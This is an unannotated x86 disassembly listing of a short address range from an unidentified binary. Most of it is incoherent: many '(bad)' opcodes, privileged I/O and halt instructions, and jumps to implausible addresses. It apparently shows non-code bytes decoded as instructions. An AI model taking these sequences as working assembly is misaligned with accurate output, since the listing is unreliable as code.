  416a3b:	add    BYTE PTR [ecx],dh
  416a3d:	adc    al,0x89
  416a3f:	push   ebp
  416a40:	cmp    DWORD PTR [ecx],edx
  416a42:	push   ebx
  416a43:	lock mov eax,0x748bdfbe
  416a49:	je     0x4169cc
  416a4b:	js     0x416a6e
  416a4d:	adc    al,0xd
  416a4f:	test   BYTE PTR [ebx+edx*1+0x141b0000],dl
  416a56:	push   0x0
  416a58:	stos   BYTE PTR es:[edi],al
  416a59:	(bad)  
  416a5a:	fisttp WORD PTR [ebx+0x51010bfc]
  416a60:	cmp    eax,0x15fcc2
  416a65:	add    cl,cl
  416a67:	mov    esi,0xcea8003e
  416a6c:	sti    
  416a6d:	mov    ebp,esp
  416a6f:	jae    0x4169f2
  416a71:	cmp    BYTE PTR [ecx],dh
  416a73:	loopne 0x416a8b
  416a75:	mov    esi,esp
  416a77:	jae    0x416a02
  416a79:	push   ebp
  416a7a:	sub    DWORD PTR [ecx],edx
  416a7c:	jns    0x45caca7e
  416a82:	push   ecx
  416a83:	mov    BYTE PTR [ebx+0x8],cl
  416a86:	xor    cl,ah
  416a88:	jns    0x182ad27a
  416a8e:	stos   BYTE PTR es:[edi],al
  416a8f:	mov    esi,0x1c748bdf
  416a94:	add    DWORD PTR [edx+0x41],eax
  416a97:	popf   
  416a98:	inc    ebx
  416a99:	hlt    
  416a9a:	stos   BYTE PTR es:[edi],al
  416a9b:	loope  0x416a7c
  416a9d:	mov    edi,DWORD PTR [esp+ebx*1+0x1]
  416aa1:	adc    DWORD PTR [eax+0x6cc7ebe9],edi
  416aa7:	dec    esp
  416aa8:	add    BYTE PTR [eax],al
  416aaa:	xor    DWORD PTR [ecx+ecx*4],edx
  416aad:	inc    ebp
  416aae:	adc    DWORD PTR [eax-0x37ceef88],ebx
  416ab4:	or     al,0x8b
  416ab6:	je     0x416aec
  416ab8:	cmp    DWORD PTR [ecx],0xc704c831
  416abe:	ins    BYTE PTR es:[edi],dx
  416abf:	dec    esp
  416ac0:	(bad)  
  416ac1:	push   DWORD PTR [ecx]
  416ac3:	adc    al,0x89
  416ac5:	push   ebp
  416ac6:	mov    ebp,0x3a97
  416acb:	add    BYTE PTR [ebp-0x4b],al
  416ace:	mov    BYTE PTR [ebp-0x43],al
  416ad1:	lahf   
  416ad2:	or     BYTE PTR [ecx+0x1490],al
  416ad8:	mov    cl,0xc8
  416ada:	sbb    ecx,DWORD PTR [ebx+0x2894804]
  416ae0:	dec    esp
  416ae1:	push   ebx
  416ae2:	std    
  416ae3:	dec    DWORD PTR [esi]
  416ae5:	in     al,0x88
  416ae7:	dec    ebp
  416ae8:	test   ebp,esp
  416aea:	out    0xb5,eax
  416aec:	jl     0x416b41
  416aee:	std    
  416aef:	sub    DWORD PTR [ebp+0x1c],0xffffff87
  416af3:	inc    ebp
  416af4:	lea    edi,[edi]
  416af6:	sbb    al,0x8b
  416af8:	cld    
  416af9:	inc    edi
  416afa:	mov    DWORD PTR [edx],eax
  416afc:	stos   BYTE PTR es:[edi],al
  416afd:	loope  0x416b06
  416aff:	(bad)  
  416b00:	std    
  416b01:	sbb    eax,DWORD PTR [edx]
  416b03:	push   edx
  416b04:	mov    edx,0x5950fbd9
  416b09:	stos   DWORD PTR es:[edi],eax
  416b0a:	sti    
  416b0b:	(bad)  
  416b0c:	ds xchg edi,eax
  416b0e:	les    ecx,FWORD PTR [eax]
  416b10:	test   al,0xd9
  416b12:	fisttp DWORD PTR [ebx+0x5589407c]
  416b18:	add    eax,0x748b0f9d
  416b1d:	dec    eax
  416b1e:	add    eax,0xf4439d2d
  416b24:	mov    edx,0xf083ebe0
  416b29:	pop    ss
  416b2a:	xchg   DWORD PTR [ebp+0xd],ecx
  416b2d:	aas    
  416b2e:	xchg   ebp,eax
  416b2f:	mov    eax,DWORD PTR [eax]
  416b31:	add    BYTE PTR [esp+esi*1-0x7f],bl
  416b35:	ret    0x9d45
  416b38:	push   ebx
  416b39:	loopne 0x416b13
  416b3b:	and    ebp,edi
  416b3d:	(bad)  
  416b3e:	ficomp WORD PTR [esi+0x5ff25de3]
  416b44:	int3   
  416b45:	int3   
  416b46:	fs lahf 
  416b48:	in     al,dx
  416b49:	adc    ebp,0x1b
  416b4c:	push   0xffd433f0
  416b51:	(bad)  
  416b52:	sbb    al,0x54
  416b54:	push   ebx
  416b55:	inc    ecx
  416b56:	xor    DWORD PTR [ebp+0x5019f843],ebx
  416b5c:	add    al,BYTE PTR [eax+0x31]
  416b5f:	lahf   
  416b60:	inc    ebx
  416b61:	clc    
  416b62:	add    DWORD PTR [esi+edi*1],edi
  416b65:	std    
  416b66:	mov    ss,WORD PTR [edx-0x7f]
  416b69:	les    edi,FWORD PTR [ecx]
  416b6b:	popf   
  416b6c:	inc    ebx
  416b6d:	cld    
  416b6e:	stos   BYTE PTR es:[edi],al
  416b6f:	loopne 0x416b80
  416b71:	push   ecx
  416b72:	stos   BYTE PTR es:[edi],al
  416b73:	call   0xd8fbbd83
  416b78:	pop    es
  416b79:	push   eax
  416b7a:	callw  0xf779
  416b7e:	push   esp
  416b7f:	lock ror ah,0x65
  416b83:	pop    edi
  416b84:	int3   
  416b85:	int3   
  416b86:	in     al,0x9e
  416b88:	in     al,dx
  416b89:	mov    eax,ds:0x3eea25
  416b8e:	ja     0x416ba3
  416b90:	push   0x56281c8b
  416b95:	inc    ecx
  416b96:	add    BYTE PTR [eax],al
  416b98:	xor    DWORD PTR [ebx+0x55e30150],ebx
  416b9e:	mov    BYTE PTR [eax+0x34],dl
  416ba1:	out    dx,eax
  416ba2:	ror    ah,0xe5
  416ba5:	pusha  
  416ba6:	int3   
  416ba7:	int3   
  416ba8:	fs popf 
  416baa:	in     al,dx
  416bab:	adc    DWORD PTR ds:0x67109f21,0xffffffd3
  416bb2:	dec    DWORD PTR [edx+0x3ec705e3]
  416bb8:	mov    edx,0x38b2fd4
  416bbd:	sahf   
  416bbe:	sar    BYTE PTR [esi],cl
  416bc0:	stos   BYTE PTR es:[edi],al
  416bc1:	fmul   QWORD PTR [ebx]
  416bc3:	mov    eax,DWORD PTR [ebx]
  416bc5:	pushf  
  416bc6:	dec    ebx
  416bc7:	hlt    
  416bc8:	mov    edx,0x798bf3d7
  416bcd:	and    BYTE PTR [edi+0x539db94d],al
  416bd3:	clc    
  416bd4:	test   al,0xe7
  416bd6:	sti    
  416bd7:	mov    eax,0x1430
  416bdc:	lods   al,BYTE PTR ds:[esi]
  416bdd:	push   esp
  416bde:	je     0x416c24
  416be0:	mov    dl,0xcf
  416be2:	test   DWORD PTR [eax],0xc031181c
  416be8:	call   0x4f9d:0x894d8910
  416bef:	sbb    BYTE PTR [edx],bh
  416bf1:	out    0x7,eax
  416bf3:	jne    0x416c0d
  416bf5:	popf   
  416bf6:	inc    ebx
  416bf7:	clc    
  416bf8:	mov    edx,0x890bdf
  416bfd:	add    cl,bh
  416bff:	das    
  416c00:	mov    DWORD PTR [ebp+0x59],edx
  416c03:	popf   
  416c04:	inc    ebx
  416c05:	adc    BYTE PTR [eax+0x30b817d6],ch
  416c0b:	adc    al,0x0
  416c0d:	add    BYTE PTR [edx+0x2c],bl
  416c10:	mov    DWORD PTR [ebp+0x39],ecx
  416c13:	popf   
  416c14:	jns    0x45cab7f6
  416c1a:	sub    DWORD PTR ds:0x189cfc43,ecx
  416c20:	xor    eax,eax
  416c22:	or     bl,BYTE PTR [eax]
  416c24:	jmp    0x8995cedc
  416c29:	in     eax,0x6c
  416c2b:	push   ebp
  416c2c:	int3   
  416c2d:	int3   
  416c2e:	cmc    
  416c2f:	pop    edi
  416c30:	int3   
  416c31:	int3   
  416c32:	in     eax,dx
  416c33:	pop    edi
  416c34:	int3   
  416c35:	int3   
  416c36:	in     eax,0x5f
  416c38:	int3   
  416c39:	int3   
  416c3a:	test   BYTE PTR [ebp+0x2bd583ec],bl
  416c40:	lds    eax,FWORD PTR [ebp-0x27]
  416c43:	adc    esi,DWORD PTR [eax]
  416c45:	add    BYTE PTR [ecx],dh
  416c47:	mov    esp,0x14710303
  416c4c:	lahf   
  416c4d:	cld    
  416c4e:	pop    esp
  416c4f:	sar    edi,cl
  416c51:	dec    edi
  416c52:	leave  
  416c53:	in     al,0xfb
  416c55:	push   DWORD PTR [esi-0x47f73b6c]
  416c5b:	(bad)  
  416c5c:	repz push 0xfffffff1
  416c5f:	pushf  
  416c60:	dec    ebx
  416c61:	clc    
  416c62:	add    BYTE PTR [eax],al
  416c64:	add    BYTE PTR [ebp-0x2d0323ed],bl
  416c6a:	dec    DWORD PTR [edx+0x6a4fe3f3]
  416c70:	xor    DWORD PTR [ecx+0x53],edx
  416c73:	hlt    
  416c74:	shl    BYTE PTR [edi+0x53],cl
  416c77:	inc    ecx
  416c78:	xor    DWORD PTR [ebp-0x2cfb2bc5],edx
  416c7e:	(bad)  
  416c7f:	(bad)  
  416c80:	fcomp  QWORD PTR [eax]
  416c82:	mov    eax,0x143102
  416c87:	jmp    0x416c54
  416c89:	pushf  
  416c8a:	or     eax,DWORD PTR [eax]
  416c8c:	xor    edx,esp
  416c8e:	dec    DWORD PTR [eax+0x6843f4]
  416c94:	in     al,0x12
  416c96:	add    BYTE PTR [eax+0x31],ch
  416c99:	push   ss
  416c9a:	inc    eax
  416c9b:	add    BYTE PTR [edx+0x7055d429],bh
  416ca1:	adc    al,0x7f
  416ca3:	ret    0x1231
  416ca6:	add    BYTE PTR [eax],al
  416ca8:	cmp    DWORD PTR [esi+ebx*4],0xfffffffe
  416cac:	push   cs
  416cad:	push   eax
  416cae:	add    esp,0x2008c35
  416cb4:	jno    0x416cca
  416cb6:	sub    eax,DWORD PTR [eax]
  416cb8:	xor    edx,DWORD PTR [eax+eax*1]
  416cbb:	mov    edi,DWORD PTR [eax+ebp*2]
  416cbe:	push   ebx
  416cbf:	inc    ecx
  416cc0:	xor    ebx,edi
  416cc2:	(bad)  
  416cc3:	mov    DWORD PTR [eax+ebx*1],ebp
  416cc6:	push   esi
  416cc7:	inc    ecx
  416cc8:	add    BYTE PTR [eax],al
  416cca:	xor    DWORD PTR [ebx-0x2a98fbed],ebx
  416cd0:	call   DWORD PTR [ecx-0x70]
  416cd3:	push   0xe4314153
  416cd8:	mov    BYTE PTR [ebp-0x3f],cl
  416cdb:	in     eax,0xe7
  416cdd:	popf   
  416cde:	lods   eax,DWORD PTR ds:[esi]
  416cdf:	dec    edi
  416ce0:	std    
  416ce1:	sub    DWORD PTR [ebp+0x20],0xffffff89
  416ce5:	adc    eax,0x3ee985
  416cea:	xor    ch,cl
  416cec:	pop    es
  416ced:	mov    esp,esp
  416cef:	cmp    ecx,DWORD PTR [ecx-0x1db066ab]
  416cf5:	mov    edx,DWORD PTR [ecx+esi*8+0x6065ccc0]
  416cfc:	int3   
  416cfd:	int3   
  416cfe:	add    al,0x9b
  416d00:	in     al,dx
  416d01:	mov    ebp,esp
  416d03:	sbb    edi,DWORD PTR [ecx]
  416d05:	inc    ebp
  416d06:	sub    eax,0xec8b04c3
  416d0b:	sbb    ebp,ecx
  416d0d:	add    eax,0x4589135a
  416d12:	xor    eax,0x6dccc0f1
  416d17:	pusha  
  416d18:	int3   
  416d19:	int3   
  416d1a:	gs pusha 
  416d1c:	int3   
  416d1d:	int3   
  416d1e:	test   BYTE PTR [ebx+0x1583ec],bl
  416d24:	lds    eax,FWORD PTR [ebp+0x1d]
  416d27:	adc    al,0x70
  416d29:	add    DWORD PTR [ecx],esi
  416d2b:	fwait
  416d2c:	inc    ebx
  416d2d:	or     BYTE PTR [eax],al
  416d2f:	add    BYTE PTR [eax+0x748bd7d8],bh
  416d35:	ins    BYTE PTR es:[edi],dx
  416d36:	mov    DWORD PTR [ebp+0x29],edx
  416d39:	adc    ecx,DWORD PTR [edi+0x3c]
  416d3c:	test   al,0xe8
  416d3e:	fisttp WORD PTR [ebx-0x48f2cb8c]
  416d44:	jns    0x416d6e
  416d46:	mov    DWORD PTR [ebp-0x2f],edx
  416d49:	mov    al,ds:0x9d390a44
  416d4e:	inc    ebx
  416d4f:	call   0x404295ad
  416d54:	xor    DWORD PTR [ebx-0x2a9b03f5],ebx
  416d5a:	call   DWORD PTR [eax-0x37]
  416d5d:	fdivp  st(0),st
  416d5f:	jmp    FWORD PTR [esi-0x47f73b6e]
  416d65:	fsubr  st,st(7)
  416d67:	push   0xfffffff1
  416d69:	mov    ebx,0x14312fff
  416d6e:	push   0x150100
  416d73:	push   0x31
  416d75:	dec    edi
  416d76:	push   ebx
  416d77:	lock test al,0xd8
  416d7a:	jecxz  0x416d07
  416d7c:	fdiv   QWORD PTR [ebx]
  416d7e:	mov    DWORD PTR [edx+0x5],eax
  416d81:	in     al,0x88
  416d83:	dec    ebp
  416d84:	cmp    ebp,esp
  416d86:	mov    BYTE PTR [ebp+0x55],dl
  416d89:	loope  0x416d72
  416d8b:	rcl    DWORD PTR [esi+ecx*2-0x3],0x83
  416d90:	jne    0x416db1
  416d92:	lds    eax,FWORD PTR [ebp+0x0]
  416d95:	add    BYTE PTR ds:0x31000013,bh
  416d9b:	cmp    eax,DWORD PTR [edi]
  416d9d:	mov    ebp,esp
  416d9f:	inc    edi
  416da0:	add    eax,0xf4439b30
  416da6:	mov    edx,0xe60fdfdf
  416dab:	jecxz  0x416db2
  416dad:	cmp    DWORD PTR [eax+ecx*2+0x71],edi
  416db1:	pop    ecx
  416db2:	mov    edx,0x8983e7d7
  416db7:	sub    BYTE PTR [eax],al
  416db9:	je     0x416e2f
  416dbb:	cdq    
  416dbc:	dec    ebx
  416dbd:	call   0x513974
  416dc2:	adc    BYTE PTR gs:[ecx+0x4299d955],cl
  416dc9:	adc    BYTE PTR [edx-0x7f742021],ch
  416dcf:	adc    BYTE PTR [ebx-0x76b2debc],cl
  416dd5:	dec    ebp
  416dd6:	rol    DWORD PTR [ecx],1
  416dd8:	shl    bh,cl
  416dda:	inc    eax
  416ddb:	adc    BYTE PTR [ecx-0x52e22eab],cl
  416de1:	inc    edx
  416de2:	ins    DWORD PTR es:[edi],dx
  416de3:	in     al,0x88
  416de5:	inc    ebp
  416de6:	cdq    
  416de7:	cdq    
  416de8:	dec    ebx
  416de9:	or     BYTE PTR [edx],dh
  416deb:	fcom   QWORD PTR [ebx]
  416ded:	push   ecx
  416dee:	stos   BYTE PTR es:[edi],al
  416def:	out    0xe7,eax
  416df1:	mov    esi,esp
  416df3:	aaa    
  416df4:	add    DWORD PTR [edx+0x35],eax
  416df7:	in     al,0xe7
  416df9:	push   ebp
  416dfa:	add    BYTE PTR [eax],al
  416dfc:	jl     0x416e4b
  416dfe:	std    
  416dff:	sub    DWORD PTR [ebp+0x20],0xffffff89
  416e03:	dec    ebp
  416e04:	pop    ecx
  416e05:	xchg   ecx,eax
  416e06:	mov    edi,0xe7dfb828
  416e0b:	jmp    0x416dd0
  416e0d:	cdq    
  416e0e:	push   ebx
  416e0f:	in     al,0x3
  416e11:	cmp    al,0xe
  416e13:	cld    
  416e14:	dec    esi
  416e15:	dec    ebp
  416e16:	add    esp,0x323bc2d
  416e1c:	icebp  
  416e1d:	adc    ebx,DWORD PTR [edi-0x2d2304]
  416e23:	dec    edi
  416e24:	sbb    DWORD PTR [ecx-0x6ed90006],ebx
  416e2a:	les    ecx,FWORD PTR [eax]
  416e2c:	test   al,0xd6
  416e2e:	fild   DWORD PTR [ebx+0x41534c54]
  416e34:	xor    DWORD PTR [ebx+esi*2],edx
  416e37:	or     bh,BYTE PTR [edx+0x7055f01e]
  416e3d:	adc    al,0x4f
  416e3f:	call   FWORD PTR [eax+esi*2-0x7f]
  416e43:	cmp    eax,0x3ee6e9
  416e48:	xor    edi,eax
  416e4a:	sbb    ebp,DWORD PTR [edx+0x71]
  416e4d:	mov    esp,0x14312fff
  416e52:	mov    DWORD PTR [ebp-0x33],edx
  416e55:	loope  0x416ddf
  416e57:	inc    ebp
  416e58:	rcr    DWORD PTR [eax+0x4d603448],1
  416e5e:	push   ebx
  416e5f:	lock add BYTE PTR [eax],al
  416e62:	xchg   edx,eax
  416e63:	addr16 push ebx
  416e65:	inc    ecx
  416e66:	xor    DWORD PTR [ecx],edi
  416e68:	adc    ebp,DWORD PTR [edx-0xf]
  416e6b:	mov    ebx,0x14312fff
  416e70:	mov    DWORD PTR [ebp-0x6b],edx
  416e73:	loope  0x416ede
  416e75:	add    BYTE PTR [esi+0x5da3efe6],cl
  416e7b:	out    0x3e,al
  416e7d:	add    BYTE PTR [edx-0xfaa2bf2],dh
  416e83:	adc    eax,DWORD PTR [eax]
  416e85:	jne    0x416ecb
  416e87:	mov    edx,0x431683f
  416e8c:	add    BYTE PTR [eax],al
  416e8e:	stos   BYTE PTR es:[edi],al
  416e8f:	(bad)  
  416e90:	sti    
  416e91:	push   eax
  416e92:	retf   
  416e93:	adc    edi,ebp
  416e95:	push   ebp
  416e96:	inc    ecx
  416e97:	jo     0x416e6d
  416e99:	push   ebp
  416e9a:	lock adc ecx,DWORD PTR [ecx+0x4b9a554d]
  416ea1:	fsubr  DWORD PTR [edx+0x748bd7e6]
  416ea7:	ins    BYTE PTR es:[edi],dx
  416ea8:	add    DWORD PTR [edx+0x65],eax
  416eab:	popf   
  416eac:	inc    ebx
  416ead:	loopne 0x416e59
  416eaf:	(bad)  
  416eb1:	mov    eax,DWORD PTR [eax+0x748b51e4]
  416eb7:	xor    BYTE PTR [eax-0x75],dl
  416eba:	xor    al,0x60
  416ebc:	push   ebx
  416ebd:	inc    ecx
  416ebe:	xor    ebp,esp
  416ec0:	out    0x91,eax
  416ec2:	cmc    
  416ec3:	dec    ebx
  416ec4:	std    
  416ec5:	add    DWORD PTR [eax],0x0
  416ec8:	cmc    
  416ec9:	sbb    BYTE PTR [ecx-0x45682eab],cl
  416ecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ed0:	xor    DWORD PTR [eax+eax*1],edx
  416ed3:	add    BYTE PTR [ebp+0xd],bl
  416ed6:	mov    DWORD PTR [ebp-0x2f],eax
  416ed9:	lahf   
  416eda:	dec    ebx
  416edb:	fdiv   DWORD PTR [edx]
  416edd:	pushf  
  416ede:	mov    al,ds:0x87143100
  416ee3:	dec    ebp
  416ee4:	lds    ebx,FWORD PTR [edi+0x60d0e053]
  416eea:	push   ebx
  416eeb:	inc    ecx
  416eec:	xor    edi,edi
  416eee:	inc    ecx
  416eef:	xor    al,0xd2
  416ef1:	adc    BYTE PTR [esi+0x41],dl
  416ef4:	xor    DWORD PTR [edi-0x2b18fbf5],ebx
  416efa:	call   DWORD PTR [eax-0x46]
  416efd:	and    esp,edx
  416eff:	push   ebp
  416f00:	lock adc edx,DWORD PTR [edx-0x75]
  416f04:	in     al,dx
  416f05:	aaa    
  416f06:	push   eax
  416f07:	call   0x3ebcf9
  416f0c:	mov    dl,0x50
  416f0e:	or     al,0x8b
  416f10:	in     al,dx
  416f11:	xor    ecx,DWORD PTR [ecx+0x3ee17d15]
  416f17:	add    BYTE PTR [edx],dh
  416f19:	in     eax,0x27
  416f1b:	mov    DWORD PTR [eax+eiz*1],ebx
  416f1e:	push   esi
  416f1f:	inc    ecx
  416f20:	xor    DWORD PTR [edi-0x2b2307c5],edx
  416f26:	(bad)  
  416f27:	jmp    DWORD PTR [eax+edi*8+0xd49e]
  416f2e:	jl     0x416f05
  416f30:	dec    DWORD PTR [edi-0x56]
  416f33:	sbb    BYTE PTR [esi+edx*2],dl
  416f36:	jo     0x416f4c
  416f38:	dec    edi
  416f39:	mov    esp,DWORD PTR [esp+eax*2]
  416f3c:	push   ebx
  416f3d:	inc    ecx
  416f3e:	xor    esi,esp
  416f40:	out    0x75,eax
  416f42:	std    
  416f43:	dec    edx
  416f44:	std    
  416f45:	sub    ebp,0x17
  416f48:	lahf   
  416f49:	aam    0x84
  416f4b:	aad    0xff
  416f4d:	dec    edi
  416f4e:	(bad)  
  416f50:	idiv   bh
  416f52:	ficom  WORD PTR [esi-0x4c35fb3c]
  416f58:	addr16 xor al,0x32
  416f5b:	aam    0xff
  416f5d:	mov    dh,BYTE PTR [eax+ecx*2]
  416f60:	push   ebx
  416f61:	inc    ecx
  416f62:	xor    ebp,esp
  416f64:	out    0x51,eax
  416f66:	mov    eax,0x7583fd4a
  416f6b:	sbb    eax,DWORD PTR [edi+0x139e7d45]
  416f71:	aam    0x4
  416f73:	aad    0xff
  416f75:	push   ecx
  416f76:	stos   BYTE PTR es:[edi],al
  416f77:	rcr    bh,1
  416f79:	mov    edi,DWORD PTR [eax+eiz*2]
  416f7c:	push   ebx
  416f7d:	inc    ecx
  416f7e:	xor    DWORD PTR [edi],edx
  416f80:	dec    eax
  416f81:	sub    al,ah
  416f83:	sahf   
  416f84:	adc    esi,eax
  416f86:	(bad)  
  416f88:	call   DWORD PTR [ecx+0x59]
  416f8b:	(bad)  
  416f8c:	sti    
  416f8d:	jmp    DWORD PTR [esi-0x6a]
  416f90:	les    ecx,FWORD PTR [eax+eax*1]
  416f93:	add    BYTE PTR [eax+0x31415343],dl
  416f99:	adc    DWORD PTR [eax+0x53],edx
  416f9c:	xor    BYTE PTR [ecx+eiz*4],dl
  416f9f:	sbb    al,0xdf
  416fa1:	aam    0xff
  416fa3:	mov    esp,gs
  416fa5:	dec    ebx
  416fa6:	dec    edi
  416fa7:	push   0xfffffff1
  416fa9:	mov    ebp,0x28448b05
  416fae:	push   esi
  416faf:	inc    ecx
  416fb0:	xor    esi,esp
  416fb2:	cld    
  416fb3:	push   ebp
  416fb4:	add    eax,0x16fbe23d
  416fb9:	dec    edx
  416fba:	mov    eax,0x143101
  416fbf:	mov    ecx,DWORD PTR [eax+ebp*8]
  416fc2:	rol    DWORD PTR [ecx+esi*1],0x58
  416fc6:	int3   
  416fc7:	int3   
  416fc8:	in     eax,0x58
  416fca:	int3   
  416fcb:	int3   
  416fcc:	test   BYTE PTR [ebp+0x1c6c8bec],bl
  416fd2:	mov    DWORD PTR [eax-0x23],eax
  416fd5:	out    0xc0,eax
  416fd7:	int3   
  416fd8:	in     eax,0x58
  416fda:	int3   
  416fdb:	int3   
  416fdc:	fs popf 
  416fde:	in     al,dx
  416fdf:	push   ebx
  416fe0:	pop    edi
  416fe1:	loope  0x416f6b
  416fe3:	cmp    eax,0x3edfd1
  416fe8:	stos   BYTE PTR es:[edi],al
  416fe9:	daa    
  416fea:	in     al,dx
  416feb:	push   ebp
  416fec:	lock adc ecx,DWORD PTR [ecx+0x3edf8935]
  416ff3:	add    dh,bh
  416ff5:	jmp    0x41cd52
  416ffa:	jb     0x417054
  416ffc:	int3   
  416ffd:	int3   
  416ffe:	in     al,0x9c
  417000:	in     al,dx
  417001:	push   ecx
  417002:	sbb    eax,edx
  417004:	add    BYTE PTR [eax+0x31],al
  417007:	jae    0x417005
  417009:	push   ebp
  41700a:	lock adc edx,DWORD PTR [eax-0x18]
  41700e:	popf   
  41700f:	dec    esp
  417010:	std    
  417011:	push   DWORD PTR [edx-0xb76f7b0]
  417017:	inc    edi
  417018:	mov    DWORD PTR [ebp+0x29],ecx
  41701b:	jecxz  0x417086
  41701d:	add    BYTE PTR [edx-0xfa9e7e1],bh
  417023:	adc    edx,DWORD PTR [edx-0x1]
  417026:	in     al,0x47
  417028:	mov    ebp,esp
  41702a:	aam    0x54
  41702c:	int3   
  41702d:	int3   
  41702e:	test   BYTE PTR [ebp-0xfea7c14],bl
  417034:	les    eax,FWORD PTR [ebp+0x19]
  417037:	adc    al,0x0
  417039:	add    BYTE PTR [ecx],dh
  41703b:	push   ecx
  41703c:	inc    ebx
  41703d:	fmul   QWORD PTR [ecx-0x11ffffec]
  417043:	into   
  417044:	repz add DWORD PTR [ecx],esi
  417047:	adc    al,0x0
  417049:	(bad)  
  41704a:	ins    BYTE PTR es:[edi],dx
  41704b:	dec    eax
  41704c:	add    BYTE PTR [eax],al
  41704e:	xor    DWORD PTR [eax*8+0x13cd45],edx
  417055:	add    BYTE PTR [ecx],dh
  417057:	popf   
  417058:	dec    ebx
  417059:	or     BYTE PTR [eax+0x55f016],ch
  41705f:	add    BYTE PTR [eax+0x14],dh
  417062:	call   0xfd8a2f10
  417067:	mov    eax,ds:0x3edec1
  41706c:	or     al,0x49
  41706e:	std    
  41706f:	add    BYTE PTR [ecx],dh
  417071:	ror    BYTE PTR [ebx],0xc7
  417074:	sub    al,0x4c
  417076:	push   ebx
  417077:	inc    ecx
  417078:	xor    DWORD PTR [eax+eax*1],edx
  41707b:	add    BYTE PTR [ecx],dh
  41707d:	cmp    eax,0x4c34c70a
  417082:	push   ebx
  417083:	inc    ecx
  417084:	xor    DWORD PTR [ebx],edx
  417086:	add    BYTE PTR [eax],al
  417088:	xor    DWORD PTR [ebp-0x2d230fc5],edx
  41708e:	(bad)  
  41708f:	jmp    esp
  417091:	sbb    eax,0xde6905c5
  417096:	add    BYTE PTR ds:[ecx],dh
  417099:	adc    al,0x0
  41709b:	add    BYTE PTR [edx-0xfaa07fa],dh
  4170a1:	adc    eax,DWORD PTR [eax]
  4170a3:	jne    0x4170d9
  4170a5:	mov    esi,0x5424feff
  4170aa:	push   ebx
  4170ab:	inc    ecx
  4170ac:	xor    DWORD PTR [ebp-0x10],esi
  4170af:	push   ebp
  4170b0:	jo     0x4170c6
  4170b2:	mov    DWORD PTR ds:0x3ee221,ecx
  4170b8:	test   al,0xd9
  4170ba:	out    0x8b,eax
  4170bc:	cmp    al,0x44
  4170be:	push   ebx
  4170bf:	inc    ecx
  4170c0:	xor    DWORD PTR [ebx+0xe843],ebx
  4170c6:	xor    dl,dl
  4170c8:	cmp    ecx,DWORD PTR [ecx+0x4d893c74]
  4170ce:	or     DWORD PTR [esi-0x2a7b23f5],ebx
  4170d4:	jmp    DWORD PTR [edi-0x7f]
  4170d7:	adc    eax,DWORD PTR [eax+0x0]
  4170da:	fisub  WORD PTR [ecx]
  4170dc:	rcl    BYTE PTR [ebp+0x70],0x14
  4170e0:	mov    eax,ds:0xffd564fc
  4170e5:	(bad)  
  4170e6:	sub    al,0x18
  4170e8:	push   esi
  4170e9:	inc    ecx
  4170ea:	xor    ecx,eax
  4170ec:	add    BYTE PTR [eax+0x31],al
  4170ef:	mov    esp,0x13f1035f
  4170f4:	mov    DWORD PTR ds:0x3ee1a5,edx
  4170fa:	add    edi,DWORD PTR [edx+eax*8]
  4170fd:	not    DWORD PTR [esi+0x39c48147]
  417103:	jae    0x41710d
  417105:	push   esi
  417106:	lock adc edi,ebp
  417109:	adc    eax,0x3ede29
  41710e:	shr    BYTE PTR [esi+edx*2],cl
  417111:	inc    ecx
  417112:	xor    DWORD PTR [ebp+0xc],esi
  417115:	push   esi
  417116:	lock adc edx,DWORD PTR [eax-0x18]
  41711a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41711b:	inc    esi
  41711c:	std    
  41711d:	push   DWORD PTR [edx-0xb76fbb0]
  417123:	inc    ebx
  417124:	mov    DWORD PTR [ebp+0x41],ecx
  417127:	in     eax,0xe7
  417129:	aad    0x0
  41712b:	add    BYTE PTR [edi],bh
  41712d:	inc    edi
  41712e:	std    
  41712f:	sub    DWORD PTR [ebp+0x10],0xffffffa1
  417133:	hlt    
  417134:	test   ch,dl
  417136:	dec    DWORD PTR [edx+0x6a52447c]
  41713c:	xor    DWORD PTR [ebp-0xc],esi
  41713f:	push   ebp
  417140:	jo     0x417156
  417142:	push   eax
  417143:	call   0x3eaff5
  417148:	mov    dl,0x4f
  41714a:	or     al,0x8b
  41714c:	ins    BYTE PTR es:[edi],dx
  41714d:	inc    esp
  41714e:	xchg   DWORD PTR [ebp+0x11],ecx
  417151:	fwait
  417152:	push   ebx
  417153:	cld    
  417154:	sub    ah,cl
  417156:	out    dx,eax
  417157:	jae    0x4170e4
  417159:	fwait
  41715a:	inc    ebx
  41715b:	loopne 0x4170de
  41715d:	fwait
  41715e:	dec    ebx
  41715f:	fadd   QWORD PTR [eax-0x310451c4]
  417165:	inc    esi
  417166:	add    esp,0x56007339
  41716c:	jo     0x417182
  41716e:	mov    DWORD PTR ds:0x3ede31,edx
  417174:	add    esi,DWORD PTR [ebp+0xc]
  417177:	push   esi
  417178:	lock adc eax,DWORD PTR [ecx]
  41717b:	inc    ebp
  41717c:	xchg   ebp,eax
  41717d:	jecxz  0x417107
  41717f:	or     eax,0x3ee09d
  417184:	xor    bl,cl
  417186:	sti    
  417187:	push   ecx
  417188:	cdq    
  417189:	pop    esi
  41718a:	idiv   edi
  41718c:	jle    0x417120
  41718e:	les    ecx,FWORD PTR [eax+eax*1]
  417191:	add    BYTE PTR [edx+0x403f3e0],ch
  417197:	push   0x9c4d5501
  41719c:	push   ebx
  41719d:	in     al,0xaa
  41719f:	sar    bl,1
  4171a1:	add    ebp,esp
  4171a3:	xchg   DWORD PTR [di+0x4d],eax
  4171a7:	call   0x5600:0x191ae04b
  4171ae:	lock adc eax,DWORD PTR [edi-0x61c5aeb3]
  4171b5:	(bad)  
  4171b6:	je     0x417204
  4171b8:	add    BYTE PTR [eax],al
  4171ba:	xor    DWORD PTR [ecx+ebp*8],edx
  4171bd:	or     DWORD PTR [edx-0xc7c0821],ebp
  4171c3:	adc    BYTE PTR [edi+0x439a0955],al
  4171c9:	clc    
  4171ca:	dec    edx
  4171cb:	iret   
  4171cc:	out    dx,eax
  4171cd:	jae    0x417208
  4171cf:	cdq    
  4171d0:	or     esi,esp
  4171d2:	pop    esp
  4171d3:	sar    edi,cl
  4171d5:	add    bh,BYTE PTR [esp+ecx*2-0x77]
  4171d9:	adc    DWORD PTR [edx],esi
  4171db:	fcomip st,st(7)
  4171dd:	mov    eax,ds:0x3edfe5
  4171e2:	xor    cl,bh
  4171e4:	test   DWORD PTR [ecx-0x7b466df],0x3e753b0
  4171ee:	xor    DWORD PTR [ecx+ecx*4],edx
